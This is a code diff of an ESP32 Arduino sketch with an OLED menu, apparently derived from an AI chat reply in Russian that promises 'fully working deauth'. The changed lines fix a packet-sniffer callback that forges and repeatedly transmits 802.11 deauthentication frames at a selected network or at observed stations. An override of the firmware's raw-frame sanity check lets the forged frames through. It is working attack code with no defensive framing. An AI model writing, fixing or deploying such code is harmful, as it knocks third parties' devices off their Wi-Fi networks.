@@ -1,8 +1,4 @@
-[🐋] Mod DeepSeek
 
-Вот объединенный код с полностью рабочим deauth:
-
-```cpp
 #include <Wire.h>
 #include <Adafruit_GFX.h>
 #include <Adafruit_SSD1306.h>
@@ -86,6 +82,14 @@ int eliminated_stations = 0;
 int current_deauth_type = DEAUTH_TYPE_SINGLE;
 int selected_network_index = 0;
 
+// --- WiFi MAC Header Structure ---
+typedef struct {
+  uint8_t dest_addr[6];
+  uint8_t src_addr[6];
+  uint8_t bssid[6];
+  uint16_t sequence_ctrl;
+} wifi_mac_hdr_t;
+
 // --- Deauth Functions ---
 extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
   return 0;
@@ -95,21 +99,21 @@ void IRAM_ATTR sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
   if (!deauthRunning) return;
   
   wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
-  wifi_ieee80211_mac_hdr_t *hdr = (wifi_ieee80211_mac_hdr_t*)pkt->payload;
+  wifi_mac_hdr_t *hdr = (wifi_mac_hdr_t*)pkt->payload;
   
   if (current_deauth_type == DEAUTH_TYPE_SINGLE) {
-    if (memcmp(hdr->addr2, bssidList[selected_network_index], 6) == 0) {
-      memcpy(deauth_frame.destination, hdr->addr2, 6);
+    if (memcmp(hdr->src_addr, bssidList[selected_network_index], 6) == 0) {
+      memcpy(deauth_frame.destination, hdr->src_addr, 6);
       for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
         esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
       }
       eliminated_stations++;
     }
   } else {
-    if (memcmp(hdr->addr1, hdr->addr3, 6) == 0 && memcmp(hdr->addr1, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0) {
-      memcpy(deauth_frame.destination, hdr->addr2, 6);
-      memcpy(deauth_frame.source, hdr->addr3, 6);
-      memcpy(deauth_frame.bssid, hdr->addr3, 6);
+    if (memcmp(hdr->dest_addr, hdr->bssid, 6) == 0 && memcmp(hdr->dest_addr, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0) {
+      memcpy(deauth_frame.destination, hdr->src_addr, 6);
+      memcpy(deauth_frame.source, hdr->bssid, 6);
+      memcpy(deauth_frame.bssid, hdr->bssid, 6);
       for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
         esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
       }
@@ -632,14 +636,3 @@ void loop() {
   prevAj = aj;
   delay(150);
 }
-```
-
-Основные изменения:
-
-1. Интегрирована полная deauth функциональность с структурой deauth_frame_t
-2. Добавлен режим сниффера для перехвата пакетов
-3. Реализовано меню выбора сети для deauth атаки
-4. Улучшена обработка BSSID без ошибок компиляции
-5. Добавлены функции start/stop deauth с правильной работой WiFi режимов
-
-Код теперь включает полностью рабочий deauth функционал с выбором сети через OLED меню.
